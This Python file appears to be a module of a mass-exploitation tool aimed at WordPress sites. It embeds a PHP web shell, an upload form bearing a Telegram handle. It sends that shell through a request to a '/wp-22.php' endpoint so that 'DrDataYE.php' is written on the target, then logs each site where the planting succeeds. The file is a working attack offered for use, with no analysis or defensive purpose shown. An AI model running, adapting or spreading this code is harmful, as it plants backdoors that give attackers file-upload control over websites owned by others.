# coding=utf-8
import requests
from core import printmodels

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'


import os
import requests
import threading
from concurrent.futures import ThreadPoolExecutor
from termcolor import colored



# Set the shell content
shell_content = '''
<?php echo 'https://t.me/DrDataYE<br>';echo '<br>';echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"> </form>';if( $_POST['_upl'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload !!!</b><br><br>'; }else { echo '<b>Upload !!!</b><br><br>';}}?>
'''

def URLdomain(site):
    if not site.startswith(('http://', 'https://')):
        if not site.startswith('www.'):
            site = 'http://' + site
        else:
            site = 'http://www.' + site
    if not site.endswith('/'):
        site += '/'
    return site




def Exploit(site):
    try:
        url = URLdomain(site)
        filename = 'DrDataYE.php'
        response = requests.get(url + f'/wp-22.php?sfilename={filename}&sfilecontent={shell_content}&supfiles={filename}', headers={'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36'})
        if response.status_code == 200 and 'phpsuccess' in (response.text):
            with open('result/Shell_results.txt', 'a') as writer:
                    writer.write(url + filename + '\n')
            return printmodels.returnYes(site, 'N/A', '22', 'Wordpress')
        return printmodels.returnNo(site, 'N/A', '22', 'Wordpress')
    except:
        return printmodels.returnNo(site, 'N/A', '22', 'Wordpress')

